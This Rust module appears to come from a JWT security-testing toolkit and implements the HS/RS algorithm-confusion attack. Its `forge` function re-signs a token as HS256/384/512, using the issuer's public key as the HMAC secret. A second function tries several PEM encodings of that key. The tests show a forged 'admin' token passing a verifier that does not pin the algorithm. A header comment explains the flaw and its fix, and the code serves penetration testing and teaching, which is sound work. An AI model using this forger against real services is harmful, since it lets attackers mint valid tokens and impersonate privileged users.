//! HS / RS algorithm confusion.
//!
//! Real-world impact: a verifier configured for RS256 that nevertheless
//! accepts whatever `alg` the token claims will treat the *public key bytes*
//! as an HMAC secret. An attacker who knows the issuer's public key can sign
//! arbitrary tokens. The fix is identical to `alg:none`: pin the expected
//! algorithm, never trust the header's claim.

use serde_json::Value;

use crate::error::Result;
use crate::parse::{decode_unverified, encode_segment_json};
use crate::sign::{raw_sign, Algorithm, SigningKey};

/// Re-sign a token's payload as `HS{256,384,512}` using the bytes of the
/// victim's public key (e.g. the contents of a `-----BEGIN PUBLIC KEY-----`
/// PEM block) as the HMAC secret.
///
/// `public_key_bytes` must be exactly the bytes the verifier would compare
/// against — typically the PEM body, including any trailing newline. Multiple
/// permutations are common in the wild (PEM with/without newlines, the
/// SubjectPublicKeyInfo DER, etc.); see [`forge_all_perms`].
pub fn forge(token: &str, public_key_bytes: &[u8], hs: Algorithm) -> Result<String> {
    if !matches!(hs, Algorithm::HS256 | Algorithm::HS384 | Algorithm::HS512) {
        return Err(crate::error::Error::InvalidInput(format!(
            "expected HS algorithm, got {hs}"
        )));
    }
    let decoded = decode_unverified(token)?;
    let mut header_obj = serde_json::to_value(&decoded.header)?;
    if let Some(map) = header_obj.as_object_mut() {
        map.insert("alg".into(), Value::String(hs.name().to_owned()));
    }
    let header_b64 = encode_segment_json(&header_obj)?;
    let payload_b64 = decoded.raw_payload;
    let signing_input = format!("{header_b64}.{payload_b64}");

    let key = SigningKey::Hmac(public_key_bytes.to_vec());
    let sig = raw_sign(hs, &key, signing_input.as_bytes())?;
    let sig_b64 = crate::parse::encode_segment_bytes(&sig);
    Ok(format!("{signing_input}.{sig_b64}"))
}

/// Generate the common permutations of the public-key bytes the verifier
/// might use. Returns `(label, token)` pairs.
pub fn forge_all_perms(token: &str, pem: &str, hs: Algorithm) -> Result<Vec<(String, String)>> {
    let trimmed = pem.trim();
    let with_nl = format!("{trimmed}\n");
    let stripped: String = trimmed
        .lines()
        .filter(|l| !l.starts_with("-----"))
        .collect::<Vec<_>>()
        .join("");

    let candidates: Vec<(&str, Vec<u8>)> = vec![
        ("pem-trimmed", trimmed.as_bytes().to_vec()),
        ("pem-with-newline", with_nl.as_bytes().to_vec()),
        ("pem-body-only", stripped.as_bytes().to_vec()),
    ];

    candidates
        .into_iter()
        .map(|(label, bytes)| forge(token, &bytes, hs).map(|t| (label.to_string(), t)))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verify::{verify, VerificationOptions, VerifyingKey};

    #[test]
    fn forged_token_validates_against_public_key_as_hmac() {
        // Pretend the public key is "PUBKEY" — both forger and verifier agree.
        let pub_bytes = b"PUBKEY";
        let original = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.AA";
        let forged = forge(original, pub_bytes, Algorithm::HS256).unwrap();

        // A defender who only checks signature (no alg pinning) is fooled:
        let opts = VerificationOptions::strict();
        let outcome = verify(&forged, &VerifyingKey::Hmac(pub_bytes.to_vec()), &opts).unwrap();
        assert!(
            outcome.is_valid(),
            "expected forged token to verify, got {outcome:?}"
        );
    }

    #[test]
    fn forge_rejects_non_hs_algorithm() {
        let r = forge("a.b.c", b"x", Algorithm::RS256);
        assert!(r.is_err());
    }
}
